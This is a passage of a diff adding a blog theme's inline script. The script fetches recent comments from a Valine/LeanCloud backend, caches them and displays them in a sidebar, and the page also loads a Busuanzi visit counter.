+        <a class='comment' href='${array[i].url}'>${array[i].content}</a>
+        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
+        </div></div>`
+      }
+    } else {
+      result += 'No Comment'
+    }
+
+    let $dom = document.querySelector('#card-newest-comments .aside-list')
+    $dom.innerHTML= result
+    window.lazyLoadInstance && window.lazyLoadInstance.update()
+    window.pjax && window.pjax.refresh($dom)
+  }
+
+  const getComment = () => {
+    const serverURL = 'https://0CCNA4v7.api.lncldglobal.com'
+
+    var settings = {
+      "method": "GET",
+      "headers": {
+        "X-LC-Id": '0CCNA4v7N3NfIoztkmU8uOaf-gzGzoHsz',
+        "X-LC-Key": 'NI4yNO6pe0VGcyaXWOjKtYkk',
+        "Content-Type": "application/json"
+      },
+    }
+
+    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
+      .then(response => response.json())
+      .then(data => {
+        const valineArray = data.results.map(function (e) {
+          return {
+            'avatar': getIcon(e.QQAvatar, e.mail),
+            'content': changeContent(e.comment),
+            'nick': e.nick,
+            'url': e.url + '#' + e.objectId,
+            'date': e.updatedAt,
+          }
+        })
+        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
+        generateHtml(valineArray)
+      }).catch(e => {
+        const $dom = document.querySelector('#card-newest-comments .aside-list')
+        $dom.innerHTML= "Unable to get the data, please make sure the settings are correct."
+      }) 
+  }
+
+  const newestCommentInit = () => {
+    if (document.querySelector('#card-newest-comments .aside-list')) {
+      const data = saveToLocal.get('valine-newest-comments')
+      if (data) {
+        generateHtml(JSON.parse(data))
+      } else {
+        getComment()
+      }
+    }
+  }
+
+  newestCommentInit()
+  document.addEventListener('pjax:complete', newestCommentInit)
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
